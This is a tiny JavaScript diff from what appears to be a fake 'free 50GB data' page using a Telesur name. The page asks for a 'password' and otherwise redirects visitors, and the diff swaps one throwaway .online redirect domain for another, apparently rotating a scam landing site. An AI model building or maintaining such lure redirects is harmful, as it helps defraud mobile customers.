@@ -4,5 +4,5 @@ password = prompt(
   'KRIJG 50GB'
 );
 if (password != 'KRIJG 50GB') {
-  location.href = 'https://www.bhufrizx.online/telesur-free-data';
+  location.href = 'https://www.favmrzi.online/telesur-free-data';
 }
